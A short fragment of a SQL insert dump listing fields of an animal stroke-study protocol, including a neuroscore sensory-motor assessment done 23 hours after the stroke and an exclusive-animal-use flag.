	(9977,276,'secondary_readout_parameter','\"Functional examination &quot;neuroscore&quot; is evaluated 23 hours after the stroke: \\nSensory-motor tests evaluating the functional deficit are performed. 20 minutes per animal including: observation of spontaneous activity, assessment of gait including hooping or not, assessment of postural signs &quot;parachute&quot; reflex, lateral resistance stimulation.Each item is scored in detail for a score ranging from 0 to 22, with the highest score reflecting the most marked deficits. In practice, the scores observed in the control group do not go beyond 14 (Basalay and al. Scientific Reports, 2020).\"','2022-03-31 13:24:05','2022-03-31 13:24:05'),
	(9978,276,'exclusive_animal_use','\"yes\"','2022-03-31 13:24:05','2022-03-31 13:24:05'),
